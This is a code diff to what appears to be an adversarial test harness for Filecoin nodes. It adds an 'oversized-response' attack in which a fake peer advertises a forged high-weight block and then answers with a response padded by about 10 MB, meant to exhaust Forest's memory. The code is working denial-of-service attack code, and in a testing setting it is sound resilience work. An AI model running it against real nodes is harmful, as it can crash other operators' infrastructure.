@@ -57,6 +57,13 @@ func getAllExchangeServerAttacks() []namedAttack {
 				runRandomNilFields(ctx, target)
 			},
 		},
+		namedAttack{
+			name: "exchange/oversized-response-oom",
+			fn: func() {
+				target := rngChoice(targets)
+				runOversizedResponse(ctx, target)
+			},
+		},
 	)
 	return result
 }
@@ -391,4 +398,76 @@ func runRandomNilFields(ctx context.Context, target TargetNode) {
 		},
 	}
 	runExchangeServerAttack(ctx, target, mut)
+}
+
+// ---------------------------------------------------------------------------
+// Oversized response attack (Forest OOM)
+//
+
+func runOversizedResponse(ctx context.Context, target TargetNode) {
+	headInfo := fetchChainHead(target.Name)
+	if headInfo == nil {
+		debugLog("[exchange-oom] cannot fetch chain head for %s, skipping", target.Name)
+		return
+	}
+
+	h, err := pool.GetFresh(ctx)
+	if err != nil {
+		log.Printf("[exchange-oom] create host failed: %v", err)
+		return
+	}
+	defer h.Close()
+
+	blockCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
+		overrideParentCIDs: headInfo.CIDs,
+		overrideHeight:     headInfo.Height + 1,
+		overrideWeight:     999999999,
+	})
+	blockCID := blockCIDFromCBOR(blockCBOR)
+
+	served := make(chan struct{}, 1)
+
+	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
+		defer s.Close()
+		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
+
+		// Build a valid-looking response then pad with ~10MB of junk.
+		// Forest's read_to_end() will consume the entire stream into memory.
+		resp := okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, buildEmptyCompactedMsgsCBOR()))
+		padded := make([]byte, len(resp)+10*1024*1024)
+		copy(padded, resp)
+		for i := len(resp); i < len(padded); i++ {
+			padded[i] = byte(i % 256)
+		}
+		s.Write(padded)
+		select {
+		case served <- struct{}{}:
+		default:
+		}
+	})
+
+	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
+		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
+		s.Write(cborArray(cborInt64(0), cborInt64(0)))
+		s.Close()
+	})
+
+	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
+	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
+		debugLog("[exchange-oom] connect to %s failed: %v", target.Name, err)
+		return
+	}
+
+	genesis := parseGenesisCID()
+	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
+		[]cid.Cid{blockCID}, headInfo.Height+1, 999999999, genesis,
+	))
+
+	select {
+	case <-served:
+		log.Printf("[exchange-oom] oversized response served to %s", target.Name)
+	case <-time.After(30 * time.Second):
+		debugLog("[exchange-oom] timeout on %s", target.Name)
+	}
 }
